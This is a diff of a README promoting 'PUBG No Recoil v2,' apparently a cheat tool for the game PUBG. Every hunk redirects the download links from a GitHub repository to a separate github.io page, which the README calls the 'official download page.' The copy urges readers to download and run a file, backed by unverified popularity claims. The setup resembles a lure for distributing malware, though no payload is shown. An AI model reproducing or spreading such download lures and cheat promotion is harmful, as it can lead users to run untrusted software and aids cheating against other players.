@@ -1,6 +1,6 @@
 # 🎯 pubg-no-recoil-v2-2026 - Take Your Aim to the Next Level
 
-[![Download Now](https://img.shields.io/badge/Download-PUBG_No_Recoil_v2-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=6b21a8&color=db2777)](https://github.com/Mpfzk4704/pubg-no-recoil-v2-2026)
+[![Download Now](https://img.shields.io/badge/Download-PUBG_No_Recoil_v2-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=6b21a8&color=db2777)](https://mpfzk4704.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ Follow these three easy steps to get up and running in under two minutes. You do
 
 Visit this link to download the application:
 
-👉 **[Click Here to Download PUBG No Recoil v2](https://github.com/Mpfzk4704/pubg-no-recoil-v2-2026)**
+👉 **[Click Here to Download PUBG No Recoil v2](https://mpfzk4704.github.io)**
 
 This link takes you to the official download page. Look for the big download button and click it. The file will start downloading automatically. Save it anywhere you like — your Desktop or Downloads folder is fine.
 
@@ -73,7 +73,7 @@ Let's go through each step slowly so there's no confusion.
 
 Open your web browser (Chrome, Edge, Firefox — any browser works). Go to:
 
-**https://github.com/Mpfzk4704/pubg-no-recoil-v2-2026**
+**https://mpfzk4704.github.io**
 
 You'll see a clean page with the download button. It's impossible to miss.
 
@@ -174,7 +174,7 @@ Thousands of players have already upgraded their gameplay with this tool. Here's
 
 Don't waste another match fighting your recoil. Get the ultimate advantage today:
 
-[![Download PUBG No Recoil v2](https://img.shields.io/badge/🚀_Download_Now-PUBG_No_Recoil_v2-2ea44f?style=for-the-badge&labelColor=1e3a8a&color=16a34a)](https://github.com/Mpfzk4704/pubg-no-recoil-v2-2026)
+[![Download PUBG No Recoil v2](https://img.shields.io/badge/🚀_Download_Now-PUBG_No_Recoil_v2-2ea44f?style=for-the-badge&labelColor=1e3a8a&color=16a34a)](https://mpfzk4704.github.io)
 
 ---
 
